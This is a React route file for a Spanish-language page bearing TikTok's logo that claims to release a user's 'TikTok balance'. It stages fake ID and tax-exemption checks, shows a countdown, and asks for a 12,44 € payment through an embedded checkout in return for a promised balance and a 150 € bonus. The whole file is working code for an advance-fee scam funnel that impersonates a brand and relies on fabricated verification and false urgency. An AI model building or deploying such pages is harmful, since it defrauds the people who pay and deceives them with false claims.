import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import tiktokLogo from "@/assets/tiktok-logo-clean.png.asset.json";
import { BACK_REDIRECT_PRODUCT_ID } from "@/lib/checkout-config";
import { CooudCheckout } from "@/components/CooudCheckout";

export const Route = createFileRoute("/back-redirect")({
  head: () => ({
    meta: [
      { title: "Descuento de impuestos aplicado | Libera tu saldo TikTok" },
      {
        name: "description",
        content:
          "Hemos identificado un descuento de impuestos y tasas: paga solo 12,44 € y recibe además 150,00 € de bono extra al liberar tu saldo.",
      },
      { property: "og:title", content: "Descuento de impuestos aplicado" },
      {
        property: "og:description",
        content: "Tasa reducida a 12,44 € + 150,00 € de bono extra. Oferta por tiempo limitado.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: BackRedirect,
});

const STEPS = [
  "Verificando DNI/NIE",
  "Localizando exenciones de impuestos",
  "Aplicando descuento de tasas estatales",
  "Calculando bono de compensación",
];

function BackRedirect() {
  const [step, setStep] = useState(0);
  const [showOffer, setShowOffer] = useState(false);
  const [seconds, setSeconds] = useState(300);
  const [showCheckout, setShowCheckout] = useState(false);

  useEffect(() => {
    const timers = STEPS.map((_, i) =>
      setTimeout(() => setStep(i), i * 1200),
    );
    const done = setTimeout(() => setShowOffer(true), STEPS.length * 1200 + 600);
    return () => {
      timers.forEach(clearTimeout);
      clearTimeout(done);
    };
  }, []);

  useEffect(() => {
    if (!showOffer) return;
    const id = setInterval(() => setSeconds((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(id);
  }, [showOffer]);

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  if (!showOffer) {
    return (
      <main className="grid min-h-screen w-full place-items-center bg-white px-6">
        <div className="flex flex-col items-center text-center">
          <img src={tiktokLogo.url} alt="TikTok" className="mb-10 h-16 w-auto animate-bounce" />
          <div className="space-y-4 text-lg font-bold text-neutral-500">
            {STEPS.map((t, i) => (
              <p
                key={t}
                className={`transition-opacity duration-500 ${
                  i <= step ? "opacity-100" : "opacity-0"
                }`}
              >
                {t}
                <span className="animate-pulse">...</span>
              </p>
            ))}
          </div>
        </div>
      </main>
    );
  }

  return (
    <main className="flex min-h-screen w-full items-center justify-center bg-white px-6 py-10">
      <section className="flex w-full max-w-md flex-col items-center text-center">
        <img src={tiktokLogo.url} alt="TikTok" className="mb-8 h-24 w-auto" />

        <div className="mb-6 w-full animate-pulse rounded-3xl border-2 border-emerald-500 bg-emerald-50 p-6">
          <p className="mb-2 text-[11px] font-black uppercase tracking-widest text-emerald-600">
            ✅ Oportunidad única en el DNI
          </p>
          <h1 className="text-2xl font-black leading-tight text-neutral-900">
            HEMOS IDENTIFICADO UN DESCUENTO DE
            <br />
            <span className="uppercase text-emerald-600">¡IMPUESTOS Y TASAS!</span>
          </h1>
        </div>

        <div className="mb-8 w-full rounded-[2.5rem] border border-neutral-100 bg-white p-8 shadow-2xl">
          <p className="mb-4 text-[10px] font-bold uppercase tracking-widest text-neutral-400">
            Esta oferta expira en:
          </p>
          <div className="mb-6 text-6xl font-black text-rose-500 tabular-nums">
            {mm}:{ss}
          </div>

          <div className="mb-6 space-y-3">
            <p className="text-lg font-bold text-neutral-700">Tasa reducida a solo:</p>
            <div className="text-4xl font-black italic text-neutral-900">12,44 €</div>
            <div className="mx-auto my-4 h-[2px] w-12 bg-neutral-200" />
            <p className="bg-gradient-to-r from-rose-500 to-sky-500 bg-clip-text text-2xl font-black uppercase italic tracking-tighter text-transparent">
              + 150,00 € de bono extra
            </p>
          </div>

          <p className="border-t border-neutral-100 pt-4 text-[11px] italic leading-tight text-neutral-400">
            *Se ha aplicado el descuento de impuestos y tasas. Al pagar los 12,44 €, el sistema
            libera tu saldo acumulado + el bono de 150,00 € inmediatamente.
          </p>
        </div>

        {showCheckout ? (
          <div className="w-full">
            <CooudCheckout
              productId={BACK_REDIRECT_PRODUCT_ID}
              showSummary={false}
              returnPath="/up1"
            />
          </div>
        ) : (
          <button
            type="button"
            onClick={() => setShowCheckout(true)}
            className="w-full rounded-full bg-gradient-to-r from-rose-500 to-rose-600 py-6 text-xl font-black uppercase tracking-tighter text-white shadow-lg transition-all hover:from-rose-600 hover:to-rose-700 active:scale-[0.99]"
          >
            Canjear mi descuento + bono
          </button>
        )}
      </section>
    </main>
  );
}
